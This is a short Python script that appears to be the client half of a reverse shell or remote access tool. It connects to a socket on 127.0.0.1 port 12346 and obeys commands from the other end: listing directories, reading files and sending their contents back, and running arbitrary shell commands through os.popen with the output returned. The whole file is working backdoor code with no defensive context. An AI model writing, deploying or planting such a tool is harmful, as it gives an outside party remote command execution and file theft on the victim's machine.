import socket
import os

def execute_command(command):
    try:
        process = os.popen(command)
        result = process.read()
        process.close()
        return result
    except Exception as e:
        return str(e)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("127.0.0.1", 12346))

    while True:
        data = s.recv(1024)
        if not data:
            s.shutdown(2)
            s.close()
            exit()

        data = data.decode()
        order, _, param = data.partition("#")

        if order == "LIST":
            tosend = "-----Listes des fichiers-----\n"
            for i, file in enumerate(os.listdir(param)):
                tosend += f"[{i}]{file}\n"
            s.sendall(tosend.encode())

        elif order == "UPLOAD":
            with open(param, "r") as f:
                tosend = f.read()
            s.sendall(tosend.encode())

        elif order == "CMD":
            result = execute_command(param)
            s.sendall(result.encode())

